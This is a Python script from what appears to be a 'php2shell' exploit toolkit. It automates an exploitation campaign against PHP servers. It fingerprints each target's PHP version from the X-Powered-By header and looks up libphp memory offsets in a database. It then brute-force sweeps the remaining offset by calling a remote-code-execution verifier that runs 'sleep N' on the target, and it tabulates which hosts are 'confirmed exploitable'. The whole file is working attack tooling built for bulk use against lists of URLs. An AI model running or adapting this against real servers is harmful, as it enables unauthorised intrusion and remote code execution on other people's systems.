#!/usr/bin/env python3
"""
php2shell PoC MATRIX builder -- end-to-end: fingerprint -> DB offsets -> test -> record.

Flow (per target URL):
  1. FINGERPRINT   one request; read `X-Powered-By: PHP/x.y.z`. No header -> UNKNOWN
                   (we then try every DB candidate).
  2. RESOLVE       pull the two STATIC vars (zif/dtor) for that version from
                   offsets_db.json. A version string can map to several builds
                   (official vs distro) -> candidate list, tried in order.
  3. TEST 3rd var  htdata is NOT in the .so. Reuse the DB's per-minor value, then
                   SWEEP +-k*0x1000 around it. The test probe is the BLIND timing
                   verifier (p2s_verify.py: runs `sleep N`, times it) -- benign,
                   no files, no exfil.
  4. RECORD        append the exact triple that worked (or FAIL) to a results table:
                   results_matrix.csv  +  rendered POC_MATRIX.md.

Usage:
  p2s_matrix.py -u http://127.0.0.1:8084/          # one target
  p2s_matrix.py -l urls.txt                         # many
  p2s_matrix.py -u URL --sleep 7 --sweep 3          # htdata sweep +-3 pages
  p2s_matrix.py -u URL --version 8.4.26             # force version (skip fingerprint)
  p2s_matrix.py --render                            # just re-render the .md from csv
"""
import argparse, csv, datetime, json, os, re, subprocess, sys, urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
DB      = os.path.join(HERE, "offsets_db.json")
VERIFY  = os.path.join(HERE, "..", "exploit", "p2s_verify.py")
CSV     = os.path.join(HERE, "results_matrix.csv")
MD      = os.path.join(HERE, "..", "POC_MATRIX.md")
PAGE    = 0x1000
FIELDS  = ["timestamp","url","detected_version","build_source","zif_offset",
           "dtor_offset","htdata_offset","sweep_k","result","method","notes"]


def load_db():
    with open(DB) as f:
        return json.load(f)["entries"]


def fingerprint(url, timeout=10):
    """One request -> PHP version from X-Powered-By (None if hidden)."""
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            xpb = r.headers.get("X-Powered-By", "")
    except Exception as e:
        # try HEAD / bare host as fallback before giving up
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                xpb = r.headers.get("X-Powered-By", "")
        except Exception:
            return None, f"no response ({e})"
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    if m:
        return m.group(1), f"X-Powered-By: {xpb}"
    return None, (f"X-Powered-By: {xpb}" if xpb else "no X-Powered-By (expose_php=Off?)")


def candidates(entries, version):
    """Ordered candidate builds for a version string.
       exact patch first, then same minor, then (if unknown) everything."""
    usable = [e for e in entries if e.get("zif_offset") and e.get("dtor_offset")
              and e.get("htdata_offset")]
    if not version:
        return usable  # UNKNOWN -> try-all
    minor = ".".join(version.split(".")[:2])
    exact = [e for e in usable if e.get("php_version") == version]
    same  = [e for e in usable if e.get("php_version","").startswith(minor + ".")
             and e not in exact]
    return exact + same


def sweep_offsets(base, k):
    """0, +1, -1, +2, -2, ... *PAGE around base."""
    yield 0, base
    for i in range(1, k + 1):
        yield  i, base + i * PAGE
        yield -i, base - i * PAGE


def run_verify(url, zif, dtor, htd, sleep_s, retries):
    cmd = [sys.executable, VERIFY, "-u", url, "--sleep", str(sleep_s),
           "--retries", str(retries), "--zif-offset", hex(zif),
           "--dtor-offset", hex(dtor), "--htdata-offset", hex(htd)]
    p = subprocess.run(cmd, capture_output=True, text=True,
                       timeout=max(120, (sleep_s + 20) * retries))
    return p.returncode == 0, p.stdout.strip().splitlines()[-1] if p.stdout else ""


def test_target(url, version, detect_note, entries, sleep_s, retries, sweep_k):
    cands = candidates(entries, version)
    if not cands:
        return {"detected_version": version or "UNKNOWN", "build_source": "-",
                "zif_offset": "-", "dtor_offset": "-", "htdata_offset": "-",
                "sweep_k": "-", "result": "NO-OFFSETS",
                "notes": detect_note + " | no DB candidate"}
    for e in cands:
        zif  = int(e["zif_offset"], 0); dtor = int(e["dtor_offset"], 0)
        base = int(e["htdata_offset"], 0)
        tag  = e.get("source") or e.get("build_id","")[:12] or e.get("php_version","")
        for k, htd in sweep_offsets(base, sweep_k):
            print(f"  [try] build={tag} zif={hex(zif)} dtor={hex(dtor)} "
                  f"htdata={hex(htd)} (k={k:+d})", flush=True)
            try:
                ok, last = run_verify(url, zif, dtor, htd, sleep_s, retries)
            except subprocess.TimeoutExpired:
                ok, last = False, "timeout"
            if ok:
                return {"detected_version": version or f"(guessed {e.get('php_version')})",
                        "build_source": tag, "zif_offset": hex(zif),
                        "dtor_offset": hex(dtor), "htdata_offset": hex(htd),
                        "sweep_k": f"{k:+d}", "result": "WORKS",
                        "notes": detect_note}
    return {"detected_version": version or "UNKNOWN",
            "build_source": "+".join(sorted({c.get('php_version','?') for c in cands})),
            "zif_offset": "(tried)", "dtor_offset": "(tried)",
            "htdata_offset": f"swept +-{sweep_k}p", "sweep_k": "-",
            "result": "FAIL", "notes": detect_note + " | no candidate landed"}


def append_row(row):
    new = not os.path.exists(CSV)
    with open(CSV, "a", newline="") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS)
        if new: w.writeheader()
        w.writerow({k: row.get(k, "") for k in FIELDS})


def render_md():
    if not os.path.exists(CSV):
        print("no results yet"); return
    rows = list(csv.DictReader(open(CSV)))
    mark = {"WORKS": "✅ WORKS", "FAIL": "❌ fail",
            "NO-OFFSETS": "⚠️ no offsets"}
    lines = ["# PHP2Shell — Working-PoC Matrix", "",
             f"_Auto-generated by `p2s_matrix.py` · last update {datetime.date.today()}_",
             "",
             "Test probe = blind sleep-timing verifier (`p2s_verify.py`, no artifacts). "
             "`zif`/`dtor` are the exact static offsets from that build's `libphp.so`; "
             "`htdata` is the per-minor value, sweep `k` = pages off the DB base.", "",
             "| Version | Build / source | zif | dtor | htdata | k | Result | Detected via |",
             "|---|---|---|---|---|---|---|---|"]
    for r in rows:
        lines.append("| {detected_version} | {build_source} | {zif_offset} | "
                     "{dtor_offset} | {htdata_offset} | {sweep_k} | {res} | {notes} |".format(
                         res=mark.get(r["result"], r["result"]),
                         **{k: (r.get(k) or "") for k in FIELDS}))
    wk = sum(r["result"] == "WORKS" for r in rows)
    lines += ["", f"**{wk}/{len(rows)}** targets confirmed exploitable."]
    with open(MD, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"[+] rendered {MD}")


def main():
    ap = argparse.ArgumentParser(description="php2shell PoC matrix: fingerprint->DB->test->record")
    ap.add_argument("-u", "--url"); ap.add_argument("-l", "--list")
    ap.add_argument("--version", help="force PHP version, skip fingerprint")
    ap.add_argument("--sleep", type=int, default=7)
    ap.add_argument("--retries", type=int, default=6)
    ap.add_argument("--sweep", type=int, default=2, help="htdata sweep +-N pages")
    ap.add_argument("--render", action="store_true", help="only re-render the .md")
    a = ap.parse_args()

    if a.render:
        render_md(); return 0
    urls = []
    if a.url:  urls.append(a.url)
    if a.list: urls += [l.strip() for l in open(a.list) if l.strip() and not l.startswith("#")]
    if not urls:
        ap.error("need -u URL or -l LIST (or --render)")

    entries = load_db()
    for url in urls:
        print(f"\n=== {url} ===")
        if a.version:
            ver, note = a.version, "version forced"
        else:
            ver, note = fingerprint(url)
            print(f"  [fingerprint] {note} -> version={ver or 'UNKNOWN'}")
        row = {"timestamp": datetime.datetime.now().isoformat(timespec="seconds"),
               "url": url, "method": "blind-timing"}
        row.update(test_target(url, ver, note, entries, a.sleep, a.retries, a.sweep))
        print(f"  [result] {row['result']}  "
              f"({row['build_source']} htdata={row['htdata_offset']})")
        append_row(row)
    render_md()
    return 0


if __name__ == "__main__":
    sys.exit(main())
